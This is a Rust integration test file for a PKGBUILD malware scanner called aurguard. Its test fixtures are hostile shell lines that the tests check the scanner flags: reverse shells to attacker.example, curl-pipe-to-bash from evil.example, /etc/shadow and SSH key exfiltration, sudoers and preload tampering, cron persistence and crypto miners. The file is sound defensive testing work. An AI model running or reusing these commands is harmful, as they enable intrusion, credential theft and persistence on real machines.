//! Integration tests exercising the analyzer end-to-end through the public
//! library API, against realistic PKGBUILD fixtures.

use aurguard::config::Config;
use aurguard::diff::Approval;
use aurguard::i18n::Lang;
use aurguard::pkgbuild::{analyze, analyze_with, PkgSources, ScanOpts};
use aurguard::report::{Risk, Severity};
use chrono::{DateTime, Utc};

fn now() -> DateTime<Utc> {
    DateTime::from_timestamp(1_705_000_000, 0).unwrap()
}

fn codes(report: &aurguard::report::Report) -> Vec<&'static str> {
    report.findings.iter().map(|f| f.code).collect()
}

/// A realistic clean PKGBUILD should produce no findings.
#[test]
fn clean_package_is_clean() {
    let pkgbuild = r#"
pkgname=ripgrep
pkgver=14.1.0
pkgrel=1
arch=('x86_64')
url="https://github.com/BurntSushi/ripgrep"
license=('MIT')
source=("https://github.com/BurntSushi/ripgrep/archive/$pkgver.tar.gz")
sha256sums=('abc123')

build() {
  cd "$srcdir/ripgrep-$pkgver"
  cargo build --release --locked
}

package() {
  install -Dm755 "target/release/rg" "$pkgdir/usr/bin/rg"
}
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.risk, Risk::Clean, "findings: {:?}", codes(&report));
}

/// A deliberately malicious PKGBUILD should trip multiple CRITICAL rules.
#[test]
fn malicious_package_is_critical() {
    let pkgbuild = r#"
pkgname=shady-tool
pkgver=1.0
pkgrel=1
source=('http://1.2.3.4/payload.tar.gz')
sha256sums=('SKIP')

prepare() {
  curl https://evil.example/stage1.sh | bash
  echo "ZXZpbA==" | base64 -d | sh
}

build() {
  eval "$obfuscated"
  chmod +x ./runme
  ./runme
}
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.risk, Risk::Critical);
    let c = codes(&report);
    for expect in [
        "INSECURE_SOURCE",
        "IP_SOURCE",
        "CURL_PIPE_SH",
        "BASE64_PIPE_SH",
        "EVAL",
        "CHMOD_EXEC",
    ] {
        assert!(c.contains(&expect), "missing {expect}; got {c:?}");
    }
}

/// A `.install` scriptlet with a hidden payload must be analyzed too.
#[test]
fn install_scriptlet_is_analyzed() {
    let pkgbuild = "pkgname=t\npkgver=1\npkgrel=1\ninstall=t.install\n";
    let install = r#"
post_install() {
  curl https://evil/backdoor | bash
}
"#;
    let sources = PkgSources {
        pkgbuild: pkgbuild.into(),
        install_scripts: vec![("t.install".into(), install.into())],
    };
    let report = analyze(None, &sources, &Config::default(), None, now());
    let c = codes(&report);
    assert!(c.contains(&"CURL_PIPE_SH"), "got {c:?}");
    assert!(c.contains(&"INSTALL_HOOK"));
}

/// Obfuscation that defeats substring matching is still caught by the AST pass:
/// `eval` appearing only in a comment or string must NOT fire, but a real
/// `eval` command must.
#[test]
fn ast_pass_distinguishes_code_from_text() {
    let benign = "build() {\n  echo 'do not eval this'  # eval mentioned\n}";
    let malicious = "build() {\n  eval \"$cmd\"\n}";
    let b = analyze(
        None,
        &PkgSources::from_pkgbuild(benign),
        &Config::default(),
        None,
        now(),
    );
    let m = analyze(
        None,
        &PkgSources::from_pkgbuild(malicious),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&b).contains(&"EVAL"));
    assert!(codes(&m).contains(&"EVAL"));
}

/// Inline `# aurguard:ignore` suppresses a specific finding on that line.
#[test]
fn inline_ignore_directive() {
    let pkgbuild = "build() {\n  eval \"$x\" # aurguard:ignore EVAL\n}";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&report).contains(&"EVAL"));
}

/// Config `[rules].ignore` drops a finding globally; severity downgrades risk.
#[test]
fn config_ignore_changes_risk() {
    let pkgbuild = "source=('https://unknown.ru/x.tar.gz')\nsha256sums=('a')\n";
    let mut cfg = Config::default();
    let before = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    assert_eq!(before.risk, Risk::Risky);

    cfg.rules.ignore.push("UNKNOWN_SOURCE".into());
    let after = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    assert_eq!(after.risk, Risk::Clean);
}

/// New high-signal security rules catch advanced attack shapes.
#[test]
fn advanced_security_rules() {
    let cases: &[(&str, &str)] = &[
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "REVERSE_SHELL"),
        ("nc -e /bin/sh attacker.example 9001", "REVERSE_SHELL"),
        ("chmod u+s /usr/bin/something", "SUID_BIT"),
        ("useradd -ou 0 -g 0 backdoor", "USER_MGMT"),
        ("echo 'evil' >> $HOME/.bashrc", "HOME_PERSIST"),
        ("cp payload /etc/profile.d/x.sh", "SYSTEM_PATH_WRITE"),
        ("history -c", "ANTI_FORENSIC"),
        (
            "python -c \"exec(__import__('base64').b64decode('...'))\"",
            "PYTHON_ENC_EXEC",
        ),
        ("printf '\\x62\\x61\\x73\\x68' | sh", "OBFUSCATION"),
    ];
    for (line, code) in cases {
        let pkgbuild = format!("build() {{\n  {line}\n}}");
        let report = analyze(
            None,
            &PkgSources::from_pkgbuild(pkgbuild),
            &Config::default(),
            None,
            now(),
        );
        assert!(
            codes(&report).contains(code),
            "line {line:?} should trigger {code}, got {:?}",
            codes(&report)
        );
    }
}

/// The YARA-style signature database catches miners, exfiltration channels and
/// persistence/defense-evasion shapes.
#[test]
fn yara_signature_rules() {
    let cases: &[(&str, &str)] = &[
        (
            "./xmrig -o stratum+tcp://pool.minexmr.com:4444",
            "CRYPTO_MINER",
        ),
        (
            "curl -X POST https://discord.com/api/webhooks/123/abc -d @loot",
            "DISCORD_EXFIL",
        ),
        (
            "curl \"https://api.telegram.org/bot123:abc/sendMessage\"",
            "TELEGRAM_EXFIL",
        ),
        (
            "echo 'ssh-rsa AAAA attacker' >> /root/.ssh/authorized_keys",
            "SSH_KEY_INJECT",
        ),
        ("echo '* * * * * sh /tmp/x' | crontab -", "CRON_PERSIST"),
        ("systemctl enable evil.service", "SYSTEMD_PERSIST"),
        ("tar czf - ~/.ssh/id_rsa | nc 1.2.3.4 9999", "CRED_HARVEST"),
        ("curl -d \"$(printenv)\" http://evil.example", "ENV_EXFIL"),
        ("setenforce 0", "DISABLE_SECURITY"),
        ("curl -k https://evil.example/x.sh", "INSECURE_FETCH"),
        (
            "pip install requests --index-url http://evil.example/simple",
            "PIP_INDEX_HIJACK",
        ),
        (
            "echo '/tmp/evil.so' > /etc/ld.so.preload",
            "LD_PRELOAD_HIJACK",
        ),
        (
            "echo 'curl evil|sh' >> ~/.bashrc",
            "SHELL_RC_PERSIST",
        ),
        (
            "curl http://169.254.169.254/latest/meta-data/iam/",
            "CLOUD_METADATA",
        ),
        (
            "curl --unix-socket /var/run/docker.sock http://x/containers",
            "DOCKER_SOCK",
        ),
        (
            "cp evil .git/hooks/post-checkout",
            "GIT_HOOK_PERSIST",
        ),
        (
            "echo 'mallory ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            "SUDOERS_TAMPER",
        ),
        (
            "curl --data-binary @/etc/shadow http://evil.example",
            "CURL_FILE_UPLOAD",
        ),
        (
            "curl http://xyz123abc.onion/payload",
            "TOR_C2",
        ),
        (
            "python -c 'import socket,os;s=socket.socket();os.dup2(s.fileno(),0);exec(\"/bin/sh\")'",
            "PY_REVERSE_SHELL",
        ),
    ];
    for (line, code) in cases {
        let pkgbuild = format!("build() {{\n  {line}\n}}");
        let report = analyze(
            None,
            &PkgSources::from_pkgbuild(pkgbuild),
            &Config::default(),
            None,
            now(),
        );
        assert!(
            codes(&report).contains(code),
            "line {line:?} should trigger {code}, got {:?}",
            codes(&report)
        );
    }
}

/// Legitimate packaging into `$pkgdir` must not trip the persistence rules.
#[test]
fn pkgdir_persistence_not_flagged() {
    let pkgbuild = "package() {\n  install -Dm644 cronfile \"$pkgdir/etc/cron.d/app\"\n  install -Dm644 svc \"$pkgdir/usr/lib/systemd/system/app.service\"\n}";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    let c = codes(&report);
    assert!(!c.contains(&"CRON_PERSIST"), "got {c:?}");
    assert!(!c.contains(&"SSH_KEY_INJECT"), "got {c:?}");
}

/// A write into $pkgdir is NOT flagged as a system-path write.
#[test]
fn pkgdir_write_is_allowed() {
    let pkgbuild = "package() {\n  install -Dm644 x \"$pkgdir/etc/x.conf\"\n}";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&report).contains(&"SYSTEM_PATH_WRITE"));
}

/// URL shorteners are flagged distinctly from generic unknown domains.
#[test]
fn url_shortener_flagged() {
    let pkgbuild = "source=('https://bit.ly/xyz')\nsha256sums=('a')\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(codes(&report).contains(&"URL_SHORTENER"));
}

/// Findings render in the configured language (Turkish here).
#[test]
fn findings_localized_turkish() {
    let pkgbuild = "build() {\n  eval \"$x\"\n}";
    let mut cfg = Config::default();
    cfg.ui.lang = Lang::Tr;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    let eval = report.findings.iter().find(|f| f.code == "EVAL").unwrap();
    assert!(eval.message.contains("eval"));
    assert!(eval.message.contains("dinamik"), "got {:?}", eval.message);
}

/// The same analysis in Azerbaijani localizes the dynamic host argument.
#[test]
fn dynamic_arg_localized_azerbaijani() {
    let pkgbuild = "source=('https://unknown.ru/x.tar.gz')\nsha256sums=('a')\n";
    let mut cfg = Config::default();
    cfg.ui.lang = Lang::Az;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    let f = report
        .findings
        .iter()
        .find(|f| f.code == "UNKNOWN_SOURCE")
        .unwrap();
    assert!(f.message.contains("unknown.ru"));
    assert!(f.message.contains("Naməlum"), "got {:?}", f.message);
}

/// The highest-severity finding sorts first in the report.
#[test]
fn findings_sorted_by_severity() {
    let pkgbuild = r#"
source=('https://unknown.ru/x.tar.gz')
sha256sums=('SKIP')
build() { eval "$x"; }
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.findings[0].severity, Severity::Critical);
}

// ---------------------------------------------------------------------------
// Tier 1 / Tier 2 deep passes (decode, ioc/wallet, taint, delta)
// ---------------------------------------------------------------------------

/// A base64-encoded miner payload is caught by the decode-and-rescan pass even
/// though the raw text contains no miner signature.
#[test]
fn decode_pass_catches_encoded_miner() {
    // base64("xmrig --donate-level 1 -o pool.minexmr.com:4444")
    let blob = "eG1yaWcgLS1kb25hdGUtbGV2ZWwgMSAtbyBwb29sLm1pbmV4bXIuY29tOjQ0NDQ=";
    let pkgbuild = format!("build() {{\n  echo {blob} | base64 -d | sh\n}}\n");
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(
        codes(&report).contains(&"DECODED_THREAT"),
        "got {:?}",
        codes(&report)
    );
}

/// A hardcoded Monero wallet + a known-bad pool host trip the IOC pass.
#[test]
fn ioc_pass_flags_wallet_and_indicator() {
    let pkgbuild = "build() {\n  POOL=pool.minexmr.com\n  WALLET=888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H\n}\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    let c = codes(&report);
    assert!(c.contains(&"IOC_MATCH"), "got {c:?}");
    assert!(c.contains(&"WALLET_ADDRESS"), "got {c:?}");
}

/// Fetch-then-eval across two lines is caught by the taint pass.
#[test]
fn taint_pass_links_fetch_to_eval() {
    let pkgbuild =
        "build() {\n  payload=\"$(curl -s https://evil.example/x)\"\n  eval \"$payload\"\n}\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(
        codes(&report).contains(&"TAINTED_EXEC"),
        "got {:?}",
        codes(&report)
    );
}

/// `--max` enables the noisier `HIGH_ENTROPY_BLOB` heuristic that the default
/// profile suppresses.
#[test]
fn max_profile_enables_entropy() {
    let blob = "Z2sdf8H2kLpQ9xVbN3mWtY7cR1eA5oP0uI6jD4hF8sG2lK9nB3vC7xZ1qW5eT0yU";
    let pkgbuild = format!("KEY={blob}\n");
    let sources = PkgSources::from_pkgbuild(&pkgbuild);
    let def = analyze(None, &sources, &Config::default(), None, now());
    let mx = analyze_with(
        None,
        &sources,
        &Config::default(),
        None,
        now(),
        ScanOpts::max(),
    );
    assert!(!codes(&def).contains(&"HIGH_ENTROPY_BLOB"));
    assert!(
        codes(&mx).contains(&"HIGH_ENTROPY_BLOB"),
        "got {:?}",
        codes(&mx)
    );
}

/// A deep pass can be turned off with its `--no-*` flag.
#[test]
fn no_taint_flag_disables_taint() {
    let pkgbuild =
        "build() {\n  payload=\"$(curl -s https://evil.example/x)\"\n  eval \"$payload\"\n}\n";
    let opts = ScanOpts {
        taint: false,
        ..ScanOpts::default()
    };
    let report = analyze_with(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
        opts,
    );
    assert!(!codes(&report).contains(&"TAINTED_EXEC"));
}

/// A version bump that introduces a new critical finding (absent at approval
/// time) raises `DELTA_NEW_RISK`, escalated to Critical.
#[test]
fn delta_flags_new_risk_on_version_bump() {
    use aurguard::aur::PackageInfo;

    let pkgbuild = "build() {\n  eval \"$x\"\n}\n";
    let sources = PkgSources::from_pkgbuild(pkgbuild);
    let meta = PackageInfo {
        name: "demo".into(),
        version: "2.0-1".into(),
        maintainer: Some("alice".into()),
        first_submitted: 1_600_000_000,
        last_modified: 1_700_000_000,
        num_votes: 50,
        url_path: None,
    };
    // Prior approval: older version, EVAL not among approved codes, different
    // digest so content is seen as changed.
    let prior = Approval {
        digest: "deadbeef".into(),
        approved_at: String::new(),
        version: Some("1.0-1".into()),
        maintainer: Some("bob".into()),
        codes: vec!["LOW_VOTES".into()],
    };
    let report = analyze_with(
        Some(&meta),
        &sources,
        &Config::default(),
        Some(&prior),
        now(),
        ScanOpts::default(),
    );
    let c = codes(&report);
    assert!(c.contains(&"DELTA_NEW_RISK"), "got {c:?}");
    assert!(c.contains(&"MAINTAINER_CHANGED"), "got {c:?}");
    let delta = report
        .findings
        .iter()
        .find(|f| f.code == "DELTA_NEW_RISK")
        .unwrap();
    assert_eq!(delta.severity, Severity::Critical);
}

/// Quote-splitting that hides a miner signature is caught by the normalize
/// pass, which also flags the obfuscation itself.
#[test]
fn normalize_pass_unmasks_obfuscation() {
    let pkgbuild = "build() {\n  ./xmr\"\"ig -o stratumhost:4444\n}\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    let c = codes(&report);
    assert!(c.contains(&"CRYPTO_MINER"), "got {c:?}");
    assert!(c.contains(&"EVASION_NORMALIZED"), "got {c:?}");
}

/// A `pkgver()` that runs the network is RCE surface, since makepkg executes it.
#[test]
fn pkgver_running_network_is_critical() {
    let pkgbuild =
        "pkgname=x\npkgver() {\n  curl -s https://evil.example/v | tr -d '\\n'\n}\nbuild() { :; }\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(
        codes(&report).contains(&"PKGVER_EXEC"),
        "got {:?}",
        codes(&report)
    );
}

/// A signature-bearing source with no `validpgpkeys` is unverifiable.
#[test]
fn missing_validpgpkeys_is_flagged() {
    let pkgbuild = "pkgname=x\npkgver=1\nsource=('https://ex.com/x.tar.gz' 'https://ex.com/x.tar.gz.sig')\nsha256sums=('SKIP' 'SKIP')\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(
        codes(&report).contains(&"MISSING_PGP"),
        "got {:?}",
        codes(&report)
    );
}

/// `--no-normalize` turns the anti-evasion pass off.
#[test]
fn no_normalize_flag_disables_pass() {
    let pkgbuild = "build() {\n  ./xmr\"\"ig -o stratumhost:4444\n}\n";
    let opts = ScanOpts {
        normalize: false,
        ..ScanOpts::default()
    };
    let report = analyze_with(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
        opts,
    );
    assert!(!codes(&report).contains(&"EVASION_NORMALIZED"));
}
